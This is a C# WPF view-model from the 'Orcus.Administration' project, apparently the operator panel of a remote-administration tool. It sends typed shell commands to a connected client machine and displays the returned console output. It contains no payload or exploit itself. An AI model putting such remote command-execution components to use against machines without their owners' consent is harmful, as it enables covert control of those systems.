using System;
using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Console;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class ConsoleViewModel : CommandView
    {
        private string _commandLine;
        private bool _isEnabled;
        private RelayCommand _sendCommand;

        public override string Name => (string) Application.Current.Resources["Console"];
        public override Category Category => Category.System;
        public ConsoleCommand ConsoleCommand { get; private set; }
        public ObservableCollection<string> ConsoleOutput { get; set; }

        public bool IsEnabled
        {
            get { return _isEnabled; }
            set
            {
                if (value)
                {
                    ConsoleCommand.Start();
                    ConsoleOutput.Clear();
                }
                else ConsoleCommand.Stop();
            }
        }

        public string CommandLine
        {
            get { return _commandLine; }
            set { SetProperty(value, ref _commandLine); }
        }

        public RelayCommand SendCommand
        {
            get
            {
                return _sendCommand ?? (_sendCommand = new RelayCommand(parameter =>
                {
                    if (string.IsNullOrWhiteSpace(CommandLine))
                        return;

                    ConsoleCommand.SendCommand(CommandLine);
                    CommandLine = string.Empty;
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            ConsoleCommand = clientController.Commander.GetCommand<ConsoleCommand>();
            ConsoleCommand.Stopped += ConsoleCommand_Stopped;
            ConsoleCommand.Started += ConsoleCommand_Started;
            ConsoleCommand.ConsoleLineReceived += ConsoleCommand_ConsoleLineReceived;
            ConsoleOutput = new ObservableCollection<string>();

            EventHandler<string> method = OpenConsoleWithPath;
            crossViewManager.RegisterMethod(this, new Guid(0xa8644e87, 0x2509, 0xa247, 0x9f, 0x5f, 0x2d,
                0xa4, 0xbc, 0x70, 0xc9, 0x89), method);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Console_16x.png", UriKind.Absolute));
        }

        private void OpenConsoleWithPath(object sender, string s)
        {
            ConsoleCommand.OpenConsoleInPath(s);
            ConsoleOutput.Clear();
        }

        private void ConsoleCommand_Started(object sender, EventArgs e)
        {
            _isEnabled = true;
            OnPropertyChanged(nameof(IsEnabled));
        }

        private void ConsoleCommand_Stopped(object sender, EventArgs e)
        {
            _isEnabled = false;
            OnPropertyChanged(nameof(IsEnabled));
        }

        private void ConsoleCommand_ConsoleLineReceived(object sender, string e)
        {
            ConsoleOutput.Add(e);
        }
    }
}